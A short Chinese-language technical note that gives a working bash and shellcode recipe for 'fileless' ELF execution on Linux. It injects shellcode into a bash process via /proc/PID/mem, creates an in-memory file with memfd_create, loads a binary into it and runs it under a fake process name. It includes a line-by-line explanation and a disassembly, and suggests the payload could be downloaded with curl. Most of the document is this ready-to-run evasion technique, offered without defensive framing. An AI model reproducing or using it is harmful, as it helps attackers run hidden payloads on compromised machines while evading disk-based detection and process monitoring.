# 无文件执行 elf
```bash
echo 'pid=$$
sc="\x68\x44\x44\x44\x44\x48\x89\xe7\x48\x31\xf6\x48\x89\xf0\xb4\x01\xb0\x3f\x0f\x05\x48\x89\xc7\xb0\x4d\x0f\x05\xb0\x22\x0f\x05"
addr=$(cat /proc/$pid/syscall | cut -d" " -f9)
exec 3>/proc/$pid/mem
tail -c +$((addr+1)) <&3 >/dev/null 2>&1
printf $sc >&3' | bash -s &

pid=$!
cd /proc/$pid/fd
while [ ! -f 4 ]; do sleep 0.5; done
cat /usr/bin/ping > 4
( exec -a bbbb ./4 baidu.com & )
kill $pid
```
解释:
1. 通过修改bash进程的内存执行shellcode,在内存中创建文件,然后执行它
2. 第2行的意思是在内存中创建一个名为 `DDDD` 的文件
    ```
    0:  68 44 44 44 44       push   0x44444444         rsp -> "DDDD"
    5:  48 89 e7             mov    rdi,rsp            rdi -> "DDDD"
    8:  48 31 f6             xor    rsi,rsi            rsi = 0
    b:  48 89 f0             mov    rax,rsi            rax = 0
    e:  b4 01                mov    ah,0x1             rax = 0x100
    10: b0 3f                mov    al,0x3f            rax = 0x13f
    12: 0f 05                syscall                   memfd_create("DDDD",0)
    14: 48 89 c7             mov    rdi,rax            rdi = 4
    17: b0 4d                mov    al,0x4d            rax = 77
    19: 0f 05                syscall                   ftruncate(4,0)
    1b: b0 22                mov    al,0x22            rax = 34
    1d: 0f 05                syscall                   pause
    ```
3. 第3~6行找到bash进程的即将调用的syscall的位置然后写入sc
4. 第10行等待bash执行shellcode,实测一般1~2秒
5. 第11行将格式为elf的可执行文件写入文件描述符 `4` ,既可以是 `curl` 下载的网络文件,也可以是 `base64` 处理过的文本文件,这里以 `ping` 为例
6. 第12行替换进程名称 `4` 为 `bbbb`
7. 最后杀死bash,且不影响 `4` 的执行